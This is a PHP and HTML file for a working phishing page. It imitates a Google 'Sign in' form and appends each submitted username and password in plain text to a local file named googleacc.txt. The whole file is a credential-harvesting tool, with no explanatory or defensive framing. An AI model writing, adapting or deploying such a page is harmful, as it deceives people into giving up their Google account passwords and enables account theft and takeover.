<?php

 if(isset($_POST['submit']))
 {
  $username = $_POST['username'];
  $password = $_POST['password'];
  $text = "username: ". $username . " , " . "password: " . $password . "\n";
  $fp = fopen('googleacc.txt', 'a+');

    if(fwrite($fp, $text))  {
        

    }
fclose ($fp);    
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <link rel="stylesheet" href="google.css">
    <style>

</style>
</head>
<body>
    <div class="container">
        <a class="button-2" href="index.php" role="button" style="text-decoration: none;">.</a>
    </div>
        <div class="box">
                <h2>Sign in</h2>
                <p>Use your Google Account</p>
                <form action="google.php" method="post">
                  <div class="inputBox">
                    <input type="email" name="username" required onkeyup="this.setAttribute('value', this.value);"  value="">
                    <label>Username</label>
                  </div>
                  <div class="inputBox">
                        <input type="password" name="password" required onkeyup="this.setAttribute('value', this.value);" value="">
                        <label>Password</label>
                      </div>
                  <input type="submit" name="submit" value="Sign In">
                </form>
              </div>
</body>
</html>